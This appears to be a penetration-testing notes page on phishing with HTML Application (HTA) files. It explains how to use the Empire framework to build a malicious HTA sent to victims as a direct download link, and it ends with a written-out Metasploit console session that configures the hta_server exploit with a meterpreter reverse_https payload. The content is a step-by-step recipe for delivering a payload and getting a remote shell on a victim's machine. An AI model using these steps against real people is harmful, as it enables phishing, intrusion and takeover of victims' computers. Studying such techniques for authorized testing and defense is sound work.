# ⭕ HTA

{% embed url="http://blog.sevagas.com/?Hacking-around-HTA-files=" %}

An HTML Application (HTA) is a Microsoft Windows program whose source consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript.

In this example we will be assuming that attachments are not allowed in our Emails, so we will need to send a user a Direct link where we will bypass the email attachment and directly download our Binary(HTA), in the following we will use Empire Framework to create our malicious binary. This attack can also be considered an attachment but here an HTA file is being downloaded and executed.

Empire is a post-exploitation framework that includes a pure Powershell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. It is the merge of the previous PowerShell Empire and Python EmPyre projects. Empire implements the ability to run Powershell agents without the need of powershell.exe, rapidly deployable post-exploitation modules from keyloggers to evade network detection PowerShell premiered at BSides in 2015.

## <mark style="color:red;">Examples</mark>

We can create Macros, HTA files and OLE Objects for phishing (this example will contain a HTA phishing style and there will be links for reference) we can start Empire from our Linux box and use the following steps \[Remember this is the most basic attack so it will get detected].

`At the time of writing I was using Empire 2.5 there is a newer version 3.0, major updates but procedure is similar`

We execute Empire :&#x20;

![](<../../.gitbook/assets/image (79).png>)

We will need to setup a listener that will listen for our connection once executed on the victim

![](<../../.gitbook/assets/image (178).png>)

We proceed to execute

![](<../../.gitbook/assets/image (52).png>)

We will setup our listener and an OutFile to send to our victim

![](<../../.gitbook/assets/image (4) (1).png>)

Execute again to create our payload, make sure to add the extension to it or Empire will create a file not functional for our attack.

![](<../../.gitbook/assets/image (29).png>)

Once here it's up to creativity on how to send this file I will continue with this just for DEMO purposes.

![](<../../.gitbook/assets/image (108).png>)

after execution, when get a reverse shell.

## <mark style="color:red;">Metasploit HTA Server</mark>

The Metasploit HTA Web Server exploit module hosts an HTA that when opened runs a payload via PowerShell.

To use, simply set the IP for the server, a custom URI, the payload you which to execute, and the IP of the listener:

```markup
root@kali:~# msfconsole -q
msf > use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set SRVHOST 192.168.216.5 
SRVHOST => 192.168.216.5
msf exploit(windows/misc/hta_server) > set URIPATH form
URIPATH => form
msf exploit(windows/misc/hta_server) > set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
msf exploit(windows/misc/hta_server) > set LHOST 192.168.216.5 
LHOST => 192.168.216.5
msf exploit(windows/misc/hta_server) > exploit 
[*] Exploit running as background job 0.

[*] Started HTTPS reverse handler on https://192.168.216...Copy
```

## <mark style="color:red;">Other Tools</mark>

{% embed url="https://www.hackingarticles.in/windows-exploitation-mshta" %}
